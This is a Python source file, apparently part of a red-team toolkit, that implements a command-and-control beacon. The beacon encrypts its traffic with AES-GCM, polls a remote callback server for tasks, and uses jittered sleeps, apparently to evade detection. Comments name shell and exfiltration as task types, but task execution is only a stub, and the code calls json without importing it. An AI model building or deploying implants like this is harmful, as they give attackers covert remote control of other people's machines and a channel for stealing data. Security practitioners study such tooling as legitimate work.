import asyncio
import httpx
import base64
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from typing import Optional, Dict
from pentkit.core.session import Session, Finding
from pentkit.core.logger import get_module_logger

logger = get_module_logger("redteam.c2")

class C2Beacon:
    def __init__(self, callback_url: str, key: bytes):
        self.callback_url = callback_url
        self.key = key
        self.aesgcm = AESGCM(key)
        self.session_id = os.urandom(8).hex()

    def _encrypt(self, data: bytes) -> bytes:
        nonce = os.urandom(12)
        ciphertext = self.aesgcm.encrypt(nonce, data, None)
        return nonce + ciphertext

    def _decrypt(self, data: bytes) -> bytes:
        nonce = data[:12]
        ciphertext = data[12:]
        return self.aesgcm.decrypt(nonce, ciphertext, None)

    async def poll(self) -> Optional[Dict]:
        """Poll the C2 server for tasks."""
        async with httpx.AsyncClient() as client:
            try:
                response = await client.get(f"{self.callback_url}/poll/{self.session_id}")
                if response.status_code == 200:
                    encrypted_task = base64.b64decode(response.text)
                    task_data = self._decrypt(encrypted_task)
                    return json.loads(task_data)
            except Exception as e:
                logger.debug(f"C2 poll failed: {e}")
        return None

    async def run(self, session: Session):
        logger.info(f"Starting C2 beacon: {self.callback_url}", extra={"target": self.callback_url})
        while True:
            task = await self.poll()
            if task:
                # Execute task (shell, exfil, etc.)
                logger.info(f"Received C2 task: {task.get('type')}")
                # Send response back to C2
            
            # Default sleep 30s with 30% jitter
            await asyncio.sleep(30 * (0.7 + 0.6 * os.urandom(1)[0] / 255))
